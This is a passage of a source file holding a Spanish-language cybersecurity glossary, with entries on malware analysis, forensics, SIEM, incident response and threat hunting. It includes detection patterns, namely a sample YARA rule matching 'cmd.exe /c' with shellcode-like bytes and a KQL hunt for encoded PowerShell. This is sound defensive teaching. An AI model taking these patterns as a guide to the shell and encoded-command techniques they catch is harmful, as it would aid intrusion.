      "| Virus | Se adjunta a un archivo y necesita ejecución |\n" +
      "| Gusano (worm) | Se propaga solo por la red |\n" +
      "| Troyano | Se disfraza de software legítimo |\n" +
      "| Ransomware | Cifra datos y exige rescate |\n" +
      "| RAT | Acceso remoto encubierto |\n" +
      "| Rootkit | Se oculta a nivel profundo del SO |\n" +
      "> 💡 Una muestra real suele combinar categorías (ej. un troyano que instala un RAT).",
    examples: [
      "WannaCry fue ransomware con capacidad de gusano.",
      "Un RAT da control remoto del equipo de la víctima.",
    ],
    related: ["Análisis en sandbox", "Indicadores de compromiso (IoC)", "Reglas YARA"],
  },
  {
    id: 391,
    module: 36,
    term: "Análisis en sandbox",
    short: "Ejecutar una muestra en un entorno aislado para observar su comportamiento sin riesgo.",
    detail:
      "Un **sandbox** es un entorno **aislado y desechable** (VM sin red real o con red simulada) donde detonar el malware y observar qué hace: archivos creados, claves de registro, conexiones de red. Servicios como **Cuckoo**, **Any.Run** o **Joe Sandbox** automatizan el reporte.\n" +
      "> ⚠️ El malware moderno detecta sandboxes (anti-VM/anti-análisis) y se 'duerme' para evadir el análisis.",
    examples: [
      "Subir una muestra a Any.Run y ver sus llamadas de red.",
      "Un snapshot de VM para revertir tras cada ejecución.",
    ],
    related: ["Clasificación de malware", "Análisis dinámico", "Indicadores de compromiso (IoC)"],
  },
  {
    id: 392,
    module: 36,
    term: "Indicadores de compromiso (IoC)",
    short: "Artefactos observables que delatan la presencia de un malware concreto.",
    detail:
      "Un **IoC** es una huella que prueba una infección: **hashes** del binario, **IPs/dominios de C2**, nombres de archivos, claves de registro, mutexes. Se comparten en feeds de **threat intelligence** (MISP, STIX/TAXII) para que otros detecten la misma amenaza.\n" +
      "> 💡 Los IoC son fáciles de cambiar para el atacante; por eso se complementan con detección por **comportamiento/TTP** (ver la Pirámide del Dolor).",
    examples: [
      "El hash SHA-256 de una muestra en VirusTotal.",
      "Un dominio de C2 añadido a la lista de bloqueo del firewall.",
    ],
    related: ["Reglas YARA", "Threat intelligence"],
  },
  {
    id: 393,
    module: 36,
    term: "Reglas YARA",
    short: "El 'lenguaje de patrones' para identificar y clasificar familias de malware.",
    detail:
      "**YARA** describe reglas que buscan **patrones** (strings, bytes, condiciones) en archivos o memoria para detectar y **clasificar familias** de malware.\n" +
      "rule EjemploMalware {\n" +
      "  strings: $a = \"cmd.exe /c\" $b = { 6A 40 68 00 30 }\n" +
      "  condition: $a and $b\n" +
      "}\n" +
      "> 💡 Es el puente entre el análisis de una muestra y la detección masiva en el parque.",
    examples: [
      "Una regla YARA que caza una familia por sus strings únicos.",
      "Escanear memoria con YARA para hallar inyecciones.",
    ],
    related: ["Indicadores de compromiso (IoC)", "Análisis estático", "Threat intelligence"],
  },
  {
    id: 394,
    module: 36,
    term: "Threat intelligence",
    short: "Conocimiento sobre adversarios y amenazas que contextualiza la defensa.",
    detail:
      "La **threat intelligence** (CTI) convierte datos sueltos (IoCs, TTPs, campañas) en **conocimiento accionable**: quién ataca, cómo y qué buscar. Se mapea a **MITRE ATT&CK** y se comparte en formatos como **STIX/TAXII** o plataformas como **MISP**.",
    examples: [
      "Atribuir una muestra a un grupo APT por sus TTPs.",
      "Enriquecer una alerta del SOC con contexto de CTI.",
    ],
    related: ["Indicadores de compromiso (IoC)", "MITRE ATT&CK", "TTP (Tácticas, Técnicas y Procedimientos)"],
  },

  // ── M37 · Malware: Análisis Estático ─────────────────────────────────────
  {
    id: 400,
    module: 37,
    term: "Análisis estático",
    short: "Examinar el binario sin ejecutarlo, para inferir qué hace.",
    detail:
      "El **análisis estático** inspecciona la muestra **sin correrla**: strings, cabeceras, importaciones, disassembly. Es **seguro** (no detona) y rápido para un primer triage, aunque la ofuscación/empaquetado lo dificulta.\n" +
      "> 💡 Se combina con el dinámico: el estático dice 'qué podría hacer', el dinámico confirma 'qué hace'.",
    examples: [
      "Listar las APIs importadas para inferir capacidades.",
      "Sacar el hash y buscarlo en VirusTotal antes de nada.",
    ],
    related: ["Strings y hashing", "Cabeceras PE", "Ghidra e IDA"],
  },
  {
    id: 401,
    module: 37,
    term: "Strings y hashing",
    short: "Las cadenas de texto y el hash son el primer vistazo a una muestra.",
    detail:
      "• **Hashing** — `md5/sha256` identifican unívocamente la muestra y permiten buscarla en feeds (VirusTotal).\n" +
      "• **Strings** — extraer el texto legible revela URLs, rutas, comandos, mensajes de ransomware.\n" +
      "strings -n 8 muestra.exe\n" +
      "> ⚠️ Pocos strings útiles suele indicar **empaquetado/ofuscación**.",
    examples: [
      "strings revelando un dominio de C2 hardcodeado.",
      "Buscar el SHA-256 en VirusTotal para ver detecciones.",
    ],
    related: ["Análisis estático", "Cabeceras PE", "Unpacking y deofuscación"],
  },
  {
    id: 402,
    module: 37,
    term: "Cabeceras PE",
    short: "La estructura del ejecutable de Windows revela mucho sobre la muestra.",
    detail:
      "El formato **PE** (*Portable Executable*) de Windows tiene cabeceras y **secciones** (.text, .data, .rsrc) e una **tabla de importaciones (IAT)** que lista las APIs que usa. Analizarlas (con `pefile`, PE-bid, CFF Explorer) delata capacidades: red, cifrado, inyección.\n" +
      "> 💡 Una entropía alta en una sección sugiere datos cifrados/empaquetados.",
    examples: [
      "Ver imports como WININET o CryptEncrypt para inferir comportamiento.",
      "Una marca de tiempo de compilación que ayuda a la atribución.",
    ],
    related: ["Strings y hashing", "Análisis estático", "Unpacking y deofuscación"],
  },
  {
    id: 403,
    module: 37,
    term: "Ghidra e IDA",
    short: "Desensambladores/decompiladores para leer la lógica del malware.",
    detail:
      "Cuando los strings no bastan, se **desensambla**: **Ghidra** (gratis, de la NSA) e **IDA** convierten el binario a ensamblador y a **pseudo-C** (decompilación), permitiendo seguir la lógica real (rutinas de cifrado, C2, anti-análisis). Es la parte más técnica del análisis estático.",
    examples: [
      "Decompilar en Ghidra la rutina que descifra la config del C2.",
      "Seguir en IDA el flujo de un dropper.",
    ],
    related: ["Cabeceras PE", "Unpacking y deofuscación", "Análisis estático"],
  },
  {
    id: 404,
    module: 37,
    term: "Unpacking y deofuscación",
    short: "Revertir el empaquetado/ofuscación que el malware usa para esconderse.",
    detail:
      "Los **packers** (UPX, Themida) comprimen/cifran el binario para evadir AV y dificultar el análisis; el malware se **desempaqueta solo** en memoria al ejecutarse. El analista debe **unpack** (a veces con `upx -d`, a veces dumpeando de memoria) y **deofuscar** strings antes de poder leer el código real.\n" +
      "upx -d muestra.exe",
    examples: [
      "upx -d para un binario empaquetado con UPX estándar.",
      "Dumpear el proceso desde memoria para obtener el código desempaquetado.",
    ],
    related: ["Ghidra e IDA", "Cabeceras PE", "Análisis dinámico"],
  },

  // ── M38 · Malware: Análisis Dinámico ─────────────────────────────────────
  {
    id: 410,
    module: 38,
    term: "Análisis dinámico",
    short: "Ejecutar la muestra de forma controlada para ver su comportamiento real.",
    detail:
      "El **análisis dinámico** detona el malware en un entorno **monitorizado y aislado** para observar lo que el estático no muestra (por ofuscación): qué archivos toca, qué procesos crea, con quién habla. Requiere un **laboratorio seguro**: VM aislada, snapshots y, a menudo, red simulada (INetSim).\n" +
      "> ⚠️ Nunca analizar malware en una máquina con acceso a la red real o a datos sensibles.",
    examples: [
      "Detonar en una VM y observar la creación de persistencia.",
      "Usar INetSim para falsear Internet y capturar el C2.",
    ],
    related: ["Process Monitor y Regshot", "Callbacks de red (C2)", "Análisis en sandbox"],
  },
  {
    id: 411,
    module: 38,
    term: "Process Monitor y Regshot",
    short: "Herramientas que registran los cambios que el malware hace en el sistema.",
    detail:
      "Para capturar el comportamiento se usan:\n" +
      "• **Process Monitor (ProcMon)** — registra en vivo accesos a archivos, registro, procesos y red.\n" +
      "• **Regshot** — toma un snapshot del registro/archivos antes y después y **compara** (diff) para ver qué cambió.\n" +
      "• **Procmon + Process Explorer** — para árbol de procesos y handles.\n" +
      "> 💡 El diff de Regshot revela rápido las claves de persistencia creadas.",
    examples: [
      "ProcMon mostrando la clave Run que el malware añade.",
      "Regshot diff revelando los archivos soltados.",
    ],
    related: ["Análisis dinámico", "Callbacks de red (C2)", "Registro de Windows"],
  },
  {
    id: 412,
    module: 38,
    term: "Callbacks de red (C2)",
    short: "Observar con quién se comunica el malware revela su infraestructura de control.",
    detail:
      "Casi todo malware **llama a casa** (C2) para recibir órdenes o exfiltrar. Capturando el tráfico (**Wireshark**, **INetSim**, **FakeNet**) se obtienen **dominios/IPs de C2**, el patrón de **beaconing** y el protocolo. Son IoCs valiosos y a menudo el objetivo del análisis.",
    examples: [
      "Wireshark capturando el beacon periódico al C2.",
      "FakeNet respondiendo al malware para provocar su siguiente fase.",
    ],
    related: ["Análisis dinámico", "Indicadores de compromiso (IoC)", "Detección de anomalías en tráfico"],
  },
  {
    id: 413,
    module: 38,
    term: "API hooking y forense de memoria",
    short: "Técnicas avanzadas para observar el malware en ejecución y en la RAM.",
    detail:
      "Para muestras evasivas se va más profundo:\n" +
      "• **API hooking** — interceptar las llamadas a la API de Windows que hace el malware para registrar su actividad real.\n" +
      "• **Forense de memoria** — con **Volatility** se analiza un volcado de RAM para hallar inyecciones, procesos ocultos y código desempaquetado que no toca el disco.\n" +
      "> 💡 La memoria suele contener el código ya desempaquetado y la config del C2 en claro.",
    examples: [
      "Volatility detectando una inyección de proceso (malfind).",
      "Hooks de API que registran cada CreateFile del malware.",
    ],
    related: ["Análisis dinámico", "Unpacking y deofuscación", "Callbacks de red (C2)"],
  },

  // ── M39 · Forense Digital: Fundamentos ───────────────────────────────────
  {
    id: 420,
    module: 39,
    term: "Forense digital",
    short: "Recolectar, preservar y analizar evidencia digital de forma que sea válida legalmente.",
    detail:
      "La **forense digital** (DFIR) investiga incidentes y delitos a partir de **evidencia digital**, con dos exigencias clave: **integridad** (la evidencia no se altera) y **trazabilidad** (todo está documentado). El objetivo es reconstruir qué pasó de forma **defendible ante un tribunal**.\n" +
      "> 💡 La regla de oro: trabajar siempre sobre una **copia**, nunca sobre la evidencia original.",
    examples: [
      "Investigar un equipo comprometido tras un incidente.",
      "Reconstruir la línea de tiempo de una exfiltración de datos.",
    ],
    related: ["Cadena de custodia", "Adquisición de imagen", "Orden de volatilidad"],
  },
  {
    id: 421,
    module: 39,
    term: "Cadena de custodia",
    short: "El registro documentado de quién tocó la evidencia, cuándo y por qué.",
    detail:
      "La **cadena de custodia** documenta cada manipulación de la evidencia desde su recolección: quién la tomó, cuándo, dónde se guardó y quién accedió. Cualquier hueco la vuelve **inadmisible** en juicio. Se apoya en **hashes** para probar que la copia no cambió.\n" +
      "> ⚠️ Una cadena de custodia rota puede tirar abajo todo un caso, por sólida que sea la evidencia técnica.",
    examples: [
      "Un formulario firmado en cada transferencia de la evidencia.",
      "Sellar y etiquetar un disco incautado con su hash.",
    ],
    related: ["Forense digital", "Adquisición de imagen", "Consideraciones legales"],
  },
  {
    id: 422,
    module: 39,
    term: "Adquisición de imagen",
    short: "Copiar bit a bit el medio original sin alterarlo, verificando con hash.",
    detail:
      "La **adquisición** crea una **imagen forense**: una copia **bit a bit** (incluyendo espacio sin asignar) del medio. Se usa un **write blocker** para no modificar el original y se calcula el **hash antes y después** para probar que la copia es idéntica.\n" +
      "dd if=/dev/sda of=imagen.dd bs=4M conv=noerror,sync\n" +
      "sha256sum /dev/sda imagen.dd\n" +
      "> 💡 Formatos comunes: `dd` (raw) y **E01** (EnCase, con metadatos y compresión).",
    examples: [
      "Clonar un disco con un write blocker antes de analizarlo.",
      "Verificar que el hash del original y la imagen coinciden.",
    ],
    related: ["Cadena de custodia", "Orden de volatilidad", "Imagen y análisis de disco"],
  },
  {
    id: 423,
    module: 39,
    term: "Orden de volatilidad",
    short: "Capturar primero lo más efímero: la RAM se pierde al apagar; el disco no.",
    detail:
      "La evidencia tiene distinta **vida útil**. La **RFC 3227** ordena qué recolectar primero, del más volátil al más persistente: **registros/caché → RAM → estado de red/conexiones → disco → backups**.\n" +
      "> ⚠️ Apagar un equipo 'para preservarlo' **destruye** la RAM, que suele contener claves, procesos y malware sin tocar disco. Ver el diagrama 'Orden de volatilidad'.",
    examples: [
      "Volcar la RAM antes de apagar un servidor comprometido.",
      "Capturar las conexiones de red activas antes de desconectarlo.",
    ],
    related: ["Adquisición de imagen", "Forense de memoria (Volatility)", "Forense digital"],
  },
  {
    id: 424,
    module: 39,
    term: "Consideraciones legales",
    short: "Para que la evidencia sirva, debe ser admisible: legalmente obtenida y bien documentada.",
    detail:
      "El mejor análisis técnico es inútil si la evidencia es **inadmisible**. Importan: la **autorización** legal (orden, consentimiento), la **cadena de custodia** intacta, la **integridad** verificable (hashes) y la capacidad del perito de **testificar** y explicar su método. El analista debe ser **imparcial** y reproducible.",
    examples: [
      "Obtener la evidencia con la orden o autorización adecuada.",
      "Documentar el método para poder defenderlo en el estrado.",
    ],
    related: ["Cadena de custodia", "Forense digital", "Herramientas forenses"],
  },
  {
    id: 425,
    module: 39,
    term: "Herramientas forenses",
    short: "El instrumental del analista: imagen, análisis, memoria y red.",
    detail:
      "El kit forense combina suites y utilidades especializadas:\n" +
      "| Categoría | Herramientas |\n" +
      "|---|---|\n" +
      "| Adquisición | dd, FTK Imager, write blocker |\n" +
      "| Disco | Autopsy, FTK, The Sleuth Kit, EnCase |\n" +
      "| Memoria | Volatility |\n" +
      "| Red | Wireshark, NetworkMiner, Zeek |\n" +
      "> 💡 Las distros **SIFT** y **CAINE** empaquetan el arsenal forense listo para usar.",
    examples: [
      "FTK Imager para adquirir, Autopsy para analizar.",
      "Arrancar SIFT Workstation para una investigación.",
    ],
    related: ["Adquisición de imagen", "Imagen y análisis de disco", "Análisis de PCAP"],
  },

  // ── M40 · Forense: Disco y Memoria ───────────────────────────────────────
  {
    id: 430,
    module: 40,
    term: "Imagen y análisis de disco",
    short: "Examinar la imagen del disco para hallar archivos, artefactos y rastros del usuario.",
    detail:
      "Sobre la imagen forense se analiza el **sistema de archivos**: archivos y metadatos (MFT en NTFS), artefactos de actividad (historial, registro, prefetch, papelera). **Autopsy** (GUI de **The Sleuth Kit**) y **FTK** automatizan la indexación, búsqueda por palabras clave y extracción de artefactos.",
    examples: [
      "Autopsy listando los archivos recientes y descargas del usuario.",
      "Analizar la MFT para ver creación/modificación de archivos.",
    ],
    related: ["Recuperación de datos", "Análisis de timeline", "Herramientas forenses"],
  },
  {
    id: 431,
    module: 40,
    term: "Forense de memoria (Volatility)",
    short: "Analizar un volcado de RAM revela lo que el disco no: procesos, inyecciones y claves.",
    detail:
      "Un volcado de **RAM** captura el estado vivo del sistema. **Volatility** lo analiza para hallar **procesos** (incluso ocultos), conexiones de red, comandos, claves de cifrado y **código inyectado** que nunca tocó el disco.\n" +
      "vol.py -f memoria.raw windows.pslist\n" +
      "vol.py -f memoria.raw windows.malfind\n" +
      "> 💡 La memoria suele contener malware ya desempaquetado y config de C2 en claro.",
    examples: [
      "pslist/pstree para ver el árbol de procesos del volcado.",
      "malfind para detectar inyección de código en procesos.",
    ],
    related: ["Orden de volatilidad", "API hooking y forense de memoria", "Análisis de timeline"],
  },
  {
    id: 432,
    module: 40,
    term: "Análisis de timeline",
    short: "Ordenar todos los eventos por tiempo para reconstruir la secuencia del incidente.",
    detail:
      "El **análisis de timeline** fusiona marcas de tiempo de múltiples fuentes (sistema de archivos, logs, registro) en una **línea cronológica** unificada para responder *qué pasó y en qué orden*. Herramientas: **plaso/log2timeline** (super timeline), **mactime**.\n" +
      "> ⚠️ Ojo con el **timestomping**: el malware altera marcas de tiempo para despistar.",
    examples: [
      "Una super timeline que ubica el momento exacto del compromiso.",
      "Correlacionar la creación de un archivo con un login sospechoso.",
    ],
    related: ["Imagen y análisis de disco", "Forense de memoria (Volatility)", "Recuperación de datos"],
  },
  {
    id: 433,
    module: 40,
    term: "Recuperación de datos",
    short: "Rescatar archivos borrados o fragmentos mediante carving y espacio no asignado.",
    detail:
      "Borrar un archivo no lo elimina: el espacio queda **no asignado** hasta sobrescribirse. Técnicas de recuperación:\n" +
      "• **File carving** — reconstruir archivos por sus **firmas** (magic bytes), sin depender del sistema de archivos (foremost, scalpel).\n" +
      "• **Slack space** — datos residuales al final del último bloque de un archivo.\n" +
      "> 💡 Por eso el borrado seguro requiere **sobrescribir**, no solo 'eliminar'.",
    examples: [
      "foremost recuperando imágenes JPG borradas por su firma.",
      "Hallar restos de un documento en el slack space.",
    ],
    related: ["Imagen y análisis de disco", "Análisis de timeline", "Adquisición de imagen"],
  },

  // ── M41 · Forense de Red ─────────────────────────────────────────────────
  {
    id: 440,
    module: 41,
    term: "Análisis de PCAP",
    short: "Examinar capturas de tráfico para reconstruir qué se comunicó por la red.",
    detail:
      "Un **PCAP** guarda el tráfico capturado. Su análisis (con **Wireshark/tshark**) reconstruye conversaciones, extrae archivos transferidos, credenciales en claro y patrones sospechosos. Es la evidencia central de la forense de red.\n" +
      "tshark -r captura.pcap -Y \"http.request\"\n" +
      "> 💡 'Follow TCP Stream' en Wireshark reconstruye una sesión completa para leerla.",
    examples: [
      "Extraer un archivo exfiltrado desde un PCAP.",
      "Ver credenciales FTP en claro dentro de la captura.",
    ],
    related: ["NetworkMiner", "Zeek (Bro)", "Detección de C2 y exfiltración"],
  },
  {
    id: 441,
    module: 41,
    term: "NetworkMiner",
    short: "Herramienta que extrae automáticamente artefactos de un PCAP sin leer paquete a paquete.",
    detail:
      "**NetworkMiner** es una herramienta de **forense de red pasiva**: a partir de un PCAP (o captura en vivo) reconstruye **hosts, sesiones, archivos transferidos, imágenes y credenciales** de forma automática, presentándolos por entidad en vez de por paquete. Acelera muchísimo el triage.",
    examples: [
      "Recuperar todos los archivos transferidos de una captura.",
      "Listar los hosts y sistemas operativos vistos en el tráfico.",
    ],
    related: ["Análisis de PCAP", "Zeek (Bro)", "Detección de C2 y exfiltración"],
  },
  {
    id: 442,
    module: 41,
    term: "Zeek (Bro)",
    short: "Motor que convierte el tráfico de red en logs estructurados ricos para análisis.",
    detail:
      "**Zeek** (antes **Bro**) no es un IDS de firmas: observa el tráfico y genera **logs estructurados** por protocolo (conn.log, dns.log, http.log, ssl.log). Es ideal para **hunting** y forense a escala, porque resume millones de paquetes en eventos consultables.",
    examples: [
      "Revisar dns.log de Zeek para hallar dominios de C2.",
      "Usar conn.log para detectar beaconing periódico.",
    ],
    related: ["Análisis de PCAP", "NetworkMiner", "Detección de C2 y exfiltración"],
  },
  {
    id: 443,
    module: 41,
    term: "Detección de C2 y exfiltración",
    short: "Reconocer en el tráfico la comunicación con el atacante y la fuga de datos.",
    detail:
      "La forense de red busca dos patrones clave:\n" +
      "• **C2 (beaconing)** — conexiones **periódicas y regulares** a un mismo destino, a veces sobre DNS o HTTPS para camuflarse.\n" +
      "• **Exfiltración** — transferencias **grandes o sostenidas** hacia el exterior, **DNS tunneling** o subidas a servicios cloud.\n" +
      "> 💡 El beaconing se delata por su **regularidad temporal**, aunque el contenido vaya cifrado.",
    examples: [
      "Detectar un beacon HTTPS cada 60 s a un dominio raro.",
      "Identificar DNS tunneling por consultas TXT anormalmente largas.",
    ],
    related: ["Zeek (Bro)", "Análisis de PCAP", "Callbacks de red (C2)"],
  },

  // ── M42 · SIEM y Monitoreo ───────────────────────────────────────────────
  {
    id: 450,
    module: 42,
    term: "SIEM",
    short: "Centraliza y correlaciona logs de toda la organización para detectar amenazas.",
    detail:
      "Un **SIEM** (*Security Information and Event Management*) **ingiere, normaliza y correlaciona** logs de endpoints, red, apps y cloud en un único lugar. Permite **detectar**, **alertar** e **investigar** desde una consola. Es el corazón de un **SOC**.\n" +
      "> 💡 Un SIEM sin buenas fuentes de log ni reglas es solo un almacén caro: el valor está en la correlación y el tuning.",
    examples: [
      "Correlacionar un login fallido masivo con un acceso exitoso posterior.",
      "Centralizar logs de firewall, AD y endpoints en una sola búsqueda.",
    ],
    related: ["Splunk y ELK", "Reglas de correlación", "SOAR"],
  },
  {
    id: 451,
    module: 42,
    term: "Splunk y ELK",
    short: "Las dos plataformas SIEM dominantes; se consultan con lenguajes propios (SPL/KQL).",
    detail:
      "• **Splunk** — SIEM comercial líder; se consulta con **SPL** (*Search Processing Language*).\n" +
      "• **ELK / Elastic Stack** — open source (Elasticsearch + Logstash + Kibana); consultas **KQL**/Lucene.\n" +
      "index=auth \"failed password\" | stats count by src_ip\n" +
      "> 💡 Ambos siguen el patrón: ingestar → indexar → buscar → visualizar.",
    examples: [
      "Una búsqueda SPL que agrupa logins fallidos por IP de origen.",
      "Un dashboard de Kibana con la actividad de autenticación.",
    ],
    related: ["SIEM", "Reglas de correlación", "Dashboards y alertas"],
  },
  {
    id: 452,
    module: 42,
    term: "Reglas de correlación",
    short: "Lógica que une varios eventos para detectar un patrón de ataque.",
    detail:
      "Una **regla de correlación** dispara una alerta cuando se cumple un **patrón** que un evento aislado no revelaría: ej. *5 logins fallidos seguidos de uno exitoso desde la misma IP* = posible fuerza bruta exitosa. Mapear las reglas a **MITRE ATT&CK** mide la cobertura de detección.\n" +
      "> ⚠️ El reto es el equilibrio: pocas reglas dejan huecos; demasiadas generan **fatiga de alertas**.",
    examples: [
      "Regla de 'viaje imposible': dos logins desde países lejanos en minutos.",
      "Detectar ejecución de PowerShell codificado (técnica ATT&CK).",
    ],
    related: ["SIEM", "Dashboards y alertas", "MITRE ATT&CK"],
  },
  {
    id: 453,
    module: 42,
    term: "Dashboards y alertas",
    short: "Visualizar el estado de seguridad y notificar lo accionable en tiempo real.",
    detail:
      "Los **dashboards** resumen visualmente la postura (logins, tráfico, alertas por severidad) para el SOC; las **alertas** notifican lo que requiere acción. La meta es **priorizar**: separar la señal del ruido y enrutar lo crítico al analista correcto.\n" +
      "> 💡 Una alerta sin contexto ni dueño es ruido; cada alerta debería ser accionable.",
    examples: [
      "Un dashboard con el top de hosts ruidosos del día.",
      "Alerta automática al detectar exfiltración hacia un dominio nuevo.",
    ],
    related: ["Reglas de correlación", "SIEM", "SOAR"],
  },
  {
    id: 454,
    module: 42,
    term: "SOAR",
    short: "Automatiza y orquesta la respuesta para que el SOC reaccione más rápido.",
    detail:
      "**SOAR** (*Security Orchestration, Automation and Response*) ejecuta **playbooks automáticos** ante una alerta: enriquecer con threat intel, aislar un host, bloquear una IP, abrir un ticket. Reduce el **tiempo de respuesta** y la carga repetitiva del analista.\n" +
      "> 💡 Automatizar lo rutinario libera al analista para la investigación que requiere criterio humano.",
    examples: [
      "Un playbook que aísla automáticamente un endpoint con malware.",
      "Enriquecer cada alerta con la reputación de la IP antes de mostrarla.",
    ],
    related: ["SIEM", "Dashboards y alertas", "Ciclo de respuesta a incidentes"],
  },

  // ── M43 · Incident Response ──────────────────────────────────────────────
  {
    id: 460,
    module: 43,
    term: "Ciclo de respuesta a incidentes",
    short: "El marco NIST 800-61 estructura cómo manejar un incidente de principio a fin.",
    detail:
      "La **respuesta a incidentes (IR)** sigue un ciclo (NIST SP 800-61): **Preparación → Detección y análisis → Contención, erradicación y recuperación → Actividad post-incidente**. Es cíclico: lo aprendido realimenta la preparación.\n" +
      "> 💡 Ver el diagrama 'Ciclo de respuesta a incidentes' con la acción clave de cada fase.",
    examples: [
      "Activar el plan de IR ante una alerta de ransomware.",
      "Un equipo (CSIRT) con roles definidos antes de que ocurra el incidente.",
    ],
    related: ["Contención", "Erradicación y recuperación", "Lecciones aprendidas"],
  },
  {
    id: 461,
    module: 43,
    term: "Contención",
    short: "Frenar la propagación del incidente sin destruir la evidencia.",
    detail:
      "La **contención** limita el daño: aislar hosts, deshabilitar cuentas, bloquear IPs. Se distingue **a corto plazo** (parar la hemorragia ya) y **a largo plazo** (medidas sostenibles mientras se erradica).\n" +
      "> ⚠️ Contener sin pensar en la **evidencia** (apagar de golpe) puede destruir la RAM y la trazabilidad forense.",
    examples: [
      "Aislar de la red el equipo infectado, pero sin apagarlo.",
      "Deshabilitar la cuenta comprometida usada para el acceso.",
    ],
    related: ["Ciclo de respuesta a incidentes", "Erradicación y recuperación", "Orden de volatilidad"],
  },
  {
    id: 462,
    module: 43,
    term: "Erradicación y recuperación",
    short: "Eliminar la amenaza por completo y restaurar las operaciones de forma segura.",
    detail:
      "• **Erradicación** — eliminar la causa raíz: malware, cuentas backdoor, persistencia, vulnerabilidad explotada.\n" +
      "• **Recuperación** — restaurar sistemas desde backups limpios, validar que están sanos y **monitorizar** de cerca por si el atacante vuelve.\n" +
      "> ⚠️ Recuperar sin erradicar la causa raíz = reinfección. Hay que estar seguro de que el atacante ya no tiene acceso.",
    examples: [
      "Reconstruir un servidor desde una imagen limpia, no solo limpiar el malware.",
      "Rotar todas las credenciales que pudieron quedar comprometidas.",
    ],
    related: ["Contención", "Ciclo de respuesta a incidentes", "Lecciones aprendidas"],
  },
  {
    id: 463,
    module: 43,
    term: "Lecciones aprendidas",
    short: "El post-mortem que convierte el incidente en mejoras concretas.",
    detail:
      "Tras el incidente, una reunión **post-mortem** (sin culpar a personas) responde: ¿qué pasó?, ¿qué funcionó?, ¿qué falló?, ¿cómo evitarlo? Genera **acciones concretas** (nuevas reglas, parches, formación) que realimentan la **Preparación**.\n" +
      "> 💡 Un incidente sin lecciones aprendidas está condenado a repetirse.",
    examples: [
      "Crear una regla de detección nueva para el TTP que se usó.",
      "Documentar la línea de tiempo y las decisiones tomadas.",
    ],
    related: ["Ciclo de respuesta a incidentes", "Playbooks y tabletops", "Erradicación y recuperación"],
  },
  {
    id: 464,
    module: 43,
    term: "Playbooks y tabletops",
    short: "Procedimientos predefinidos y simulacros que preparan al equipo antes del incidente real.",
    detail:
      "• **Playbooks de IR** — guías paso a paso por tipo de incidente (ransomware, phishing, BEC) para no improvisar bajo presión.\n" +
      "• **Tabletop exercises** — simulacros de mesa donde el equipo 'juega' un escenario para validar el plan y los roles.\n" +
      "> 💡 El momento de descubrir que el plan falla es en un simulacro, no en el incidente real.",
    examples: [
      "Un playbook de ransomware con pasos de contención y contactos.",
      "Un tabletop anual simulando una brecha de datos.",
    ],
    related: ["Lecciones aprendidas", "Ciclo de respuesta a incidentes", "Contención"],
  },

  // ── M44 · Threat Hunting ─────────────────────────────────────────────────
  {
    id: 470,
    module: 44,
    term: "Threat hunting",
    short: "Buscar proactivamente atacantes que ya eludieron las defensas automáticas.",
    detail:
      "El **threat hunting** asume que el atacante **ya está dentro** y lo busca de forma **proactiva**, sin esperar una alerta. Combina hipótesis, datos (logs, EDR, red) y conocimiento del adversario para encontrar lo que las reglas automáticas no vieron.\n" +
      "> 💡 Detección = reactiva (espera la alerta); hunting = proactiva (va a buscar al intruso).",
    examples: [
      "Buscar señales de movimiento lateral que ninguna alerta disparó.",
      "Rastrear el uso anómalo de una herramienta legítima (LOLBins).",
    ],
    related: ["Hunting basado en hipótesis", "Mapeo a ATT&CK", "Consultas KQL/SPL"],
  },
  {
    id: 471,
    module: 44,
    term: "Hunting basado en hipótesis",
    short: "Partir de una suposición concreta sobre cómo podría estar actuando un atacante.",
    detail:
      "Un buen hunt empieza con una **hipótesis** comprobable, a menudo derivada de **threat intelligence** o de una técnica ATT&CK: *'Si un atacante usara Pass-the-Hash, vería autenticaciones NTLM anómalas entre estos hosts'*. Luego se buscan los datos que la confirmen o descarten.",
    examples: [
      "Hipótesis: 'hay persistencia vía tareas programadas creadas de noche'.",
      "Hipótesis basada en un informe de CTI sobre un grupo activo.",
    ],
    related: ["Threat hunting", "Mapeo a ATT&CK", "Threat intelligence"],
  },
  {
    id: 472,
    module: 44,
    term: "Mapeo a ATT&CK",
    short: "Usar la matriz MITRE ATT&CK para guiar la caza y medir la cobertura.",
    detail:
      "**MITRE ATT&CK** da un catálogo de **TTPs** reales que sirve de **mapa** para el hunting: elegir técnicas a cazar, priorizar por las que usan los adversarios relevantes y **medir la cobertura** de detección (¿qué técnicas vería mi SOC?). El **ATT&CK Navigator** visualiza esa cobertura.",
    examples: [
      "Cazar T1053 (Scheduled Task) como técnica de persistencia.",
      "Pintar en ATT&CK Navigator qué técnicas cubren mis detecciones.",
    ],
    related: ["Hunting basado en hipótesis", "MITRE ATT&CK", "Hunting playbooks"],
  },
  {
    id: 473,
    module: 44,
    term: "Consultas KQL/SPL",
    short: "Los lenguajes para interrogar los datos durante una caza.",
    detail:
      "El hunting se materializa en **consultas** sobre los datos: **KQL** (Microsoft Sentinel/Defender) y **SPL** (Splunk) son los más usados. Permiten filtrar, agregar y correlacionar grandes volúmenes para confirmar o descartar la hipótesis.\n" +
      "DeviceProcessEvents | where FileName == \"powershell.exe\" and ProcessCommandLine contains \"-enc\"\n" +
      "> 💡 Una consulta de hunting que resulta útil se convierte en una regla de detección permanente.",
    examples: [
      "KQL que busca PowerShell con comandos codificados.",
      "SPL que detecta procesos hijos anómalos de Office.",
    ],
    related: ["Threat hunting", "Hunting playbooks", "Splunk y ELK"],
  },
  {
    id: 474,
    module: 44,
    term: "Hunting playbooks",
    short: "Cazas repetibles y documentadas que se ejecutan de forma recurrente.",
    detail:
      "Un **hunting playbook** documenta un hunt para poder **repetirlo y automatizarlo**: la hipótesis, las fuentes de datos, las consultas y qué hacer con los hallazgos. Los hunts exitosos se **convierten en detección automática**, cerrando el ciclo entre caza proactiva y monitoreo.",
    examples: [
      "Un playbook mensual de caza de persistencia en Windows.",
      "Convertir un hunt fructífero en una regla del SIEM.",
    ],
    related: ["Consultas KQL/SPL", "Mapeo a ATT&CK", "Reglas de correlación"],
  },

  // ── M45 · Cloud Security: AWS ────────────────────────────────────────────
  {
    id: 480,
    module: 45,
    term: "Modelo de responsabilidad compartida",
    short: "El proveedor protege la nube; tú proteges lo que pones en ella.",
    detail:
      "En la nube la seguridad se **reparte**: el proveedor (AWS) asegura la **infraestructura** ('seguridad **de** la nube'); el cliente asegura **sus datos, identidades y configuración** ('seguridad **en** la nube').\n" +
      "| Responsable | Ejemplos |\n" +
      "|---|---|\n" +
      "| Proveedor | Hardware, hipervisor, red física |\n" +
